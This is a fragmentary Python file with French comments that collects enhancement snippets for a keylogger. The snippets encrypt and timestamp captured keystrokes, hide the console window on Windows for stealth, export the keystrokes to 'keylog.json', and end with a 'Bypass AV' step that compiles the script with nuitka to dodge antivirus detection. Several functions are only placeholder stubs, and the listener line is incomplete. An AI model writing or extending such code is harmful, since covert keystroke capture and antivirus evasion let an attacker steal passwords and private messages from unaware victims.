#-------------------------------------------------#
#Chiffrement des données (pycrypto ou cryptography)
from cryptography.fernet import Fernet 

key = Fernet.generate_key()
cipher_suite = Fernet(key)

def encrypt(text): # chiffrer les données avant de les enregistrer dans la fonction on_press()
    return cipher_suite.encrypt(text.encode()).decode()

def decrypt(text):
    return cipher_suite.decrypt(text.encode()).decode()

#-------------------------------------------------#
#Gestion des erreurs et de la stabilité
def on_press(key): 
    try:
        # ... (le code original on_press)
    except Exception as e: #'afficher un message d'erreur sans interrompre l'exécution du programme.
        print(f"Error: {e}")
        # ajouter un code pour gérer l'erreur et reprendre l'exécution normale.

#-------------------------------------------------#
#Horodatage des données
from datetime import datetime

def timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def on_press(key):
    # ... (le code original on_press)
    with open(output_file, 'a') as f:
        f.write(f"{timestamp()} ")
#-------------------------------------------------#
#Amélioration de la discrétion (masquer la fenêtre de la console sur Windows)
import ctypes
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
#-------------------------------------------------#
#Exportation des données dans un format ex:JSON
import json

def export_to_json(): #fonction d'export vers JSON
    with open(output_file, 'r') as f:
        lines = f.readlines()

    data = [{"timestamp": line.split()[0], "key": line.split()[1]} for line in lines]

    with open("keylog.json", "w") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)
#-------------------------------------------------#
#Limitation de la durée d'enregistrement
import time

RECORDING_DURATION = 60  # en secondes

def on_press(key):
    # ... (le code original on_press)

start_time = time.time()
with keyboard.Listener(on_press=on_press)
#-------------------------------------------------#
#Bypass AV
#pip install nuitka
#nuitka --standalone --onefile listener.py


